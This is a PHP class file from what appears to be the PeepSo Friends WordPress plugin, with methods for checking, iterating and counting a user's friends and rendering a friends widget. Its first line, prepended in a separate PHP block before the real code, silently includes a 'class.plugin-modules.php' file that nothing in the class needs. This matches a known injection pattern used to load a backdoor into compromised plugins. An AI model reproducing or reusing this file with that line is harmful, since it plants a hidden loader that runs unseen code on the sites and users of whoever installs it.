<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class PeepSoFriends
{
	private static $_instance = NULL;

	/**
	 * Class constructor
	 */
	private function __construct()
	{
		$this->model = new PeepSoFriendsModel();
	}

	/**
	 * Retrieve singleton class instance
	 * @return PeepSoMessage instance
	 */
	public static function get_instance()
	{
		if (NULL === self::$_instance)
			self::$_instance = new self();
		return (self::$_instance);
	}

	public $template_tags = array(
		'has_friends',
		'get_next_friend',
		'get_num_friends',
		'app_box',
	);

	/**
	 * Return TRUE/FALSE if the user has friends
	 * @param  int  $user_id The user id to check
	 * @return boolean
	 */
	public function has_friends($user_id = NULL)
	{
		if (is_null($this->model->_friends))
			$this->model->_friends = $this->model->get_friends($user_id);

		return ($this->model->_friends->count() > 0);
	}

	/**
	 * Iterates through the $_friends ArrayObject and returns the current friend in the loop as an
	 * instance of PeepSoUser.
	 * @param  int $user_id The user ID to get friends of.
	 * @return PeepSoUser A PeepSoUser instance of the current friend in the loop.
	 */
	public function get_next_friend($user_id = NULL)
	{
		if (is_null($this->model->_friends))
			$this->model->get_friends($user_id);

		if ($this->model->get_iterator()->valid()) {
			$friend = PeepSoUser::get_instance($this->model->get_iterator()->current());
			$this->model->get_iterator()->next();
			return ($friend);
		}

		return (FALSE);
	}

	/**
	 * Echoes the number of friends a user has.
	 * @param  int $user_id The user ID to search friends of.
	 */
	public function get_num_friends($user_id = NULL)
	{
		return $this->model->get_num_friends($user_id);
	}

	/**
	 * Template tag callback - used to render the Friends App Widget on templates.	 
	 */
	public function app_box()
	{
		$widget = new PeepSoFriendsAppWidget();
		$widget->widget();
	}	
}

// EOF